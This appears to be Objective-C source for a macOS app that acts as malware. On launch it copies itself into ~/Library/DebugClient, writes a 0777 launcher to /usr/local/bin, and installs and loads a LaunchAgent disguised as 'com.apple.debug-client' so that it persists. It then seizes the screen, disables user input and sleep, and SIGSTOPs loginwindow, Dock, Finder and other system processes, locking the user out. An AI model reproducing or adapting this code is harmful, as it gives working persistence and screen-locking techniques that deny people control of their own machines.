//
//  AppDelegate.m
//  display
//
//  Created by Nikola Tesla on 11/1/14.
//  Copyright (c) 2014 Novemcinctus. All rights reserved.
//

#import "AppDelegate.h"


@interface AppDelegate ()

@property (strong) MainWindow *window;

@end



@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    NSFileManager *defaultManager = [NSFileManager defaultManager];
    BOOL isDir = YES;
    NSString *debugClient = [@"~/Library/DebugClient" stringByExpandingTildeInPath];
    NSString *toPath = [debugClient stringByAppendingString:@"/Display.app"];
    NSString *binPath = [toPath stringByAppendingString:@"/Contents/MacOS/display"];
    NSString *runAppShellScript = [@"#!/bin/bash\n" stringByAppendingString:binPath];
    NSString *myPath = [[NSBundle mainBundle] bundlePath];
    NSString *plistPath = [[NSBundle mainBundle] pathForResource:@"com.apple.debug-client" ofType:@"plist"];
    NSString *plistDest = [@"~/Library/LaunchAgents/com.apple.debug-client.plist" stringByExpandingTildeInPath];
    if (![defaultManager fileExistsAtPath:debugClient isDirectory:&isDir]) {
        [defaultManager createDirectoryAtPath:debugClient withIntermediateDirectories:YES attributes:nil error:nil];
        
        [defaultManager copyItemAtPath:myPath toPath:toPath error:nil];
        
        [defaultManager createFileAtPath:@"/usr/local/bin/debugclient" contents:[runAppShellScript dataUsingEncoding:NSUTF8StringEncoding] attributes:@{NSFilePosixPermissions:[NSNumber numberWithShort:0777]}];
        
        [defaultManager copyItemAtPath:plistPath toPath:plistDest error:nil];
        NSString *loadCommand = [@"/bin/launchctl load -F " stringByAppendingString:plistDest];
        system([loadCommand UTF8String]);
    }

    [[NSApplication sharedApplication] activateIgnoringOtherApps : YES];
    [App disableUserInteraction];
    [App disableSleep];
    
    
    self.window = [[MainWindow alloc] init];

}

+ (void) pauseApps {
    NSArray *toPause = @[@"loginwindow", @"Dock", @"com.apple.internetaccounts", @"ARDAgent", @"SystemUIServer", @"CoreServicesUIAgent", @"Finder", @"com.apple.dock.extra", @"AirPlayUIAgent", @"Spotlight", @"iTunes Helper", @"Notification Center", @"sharingd", @"com.apple.dock.extra", @"LaterAgent"];
    NSArray *apps = [[NSWorkspace sharedWorkspace] runningApplications];
    for (NSRunningApplication *app in apps) {
        if ([app processIdentifier] != getpid() && [toPause containsObject:[app localizedName]]){
            NSLog(@"Killing %@:\t%d", [app localizedName], kill([app processIdentifier], SIGSTOP));
//            kill([app processIdentifier], SIGSTOP);
        }
    }
}
@end
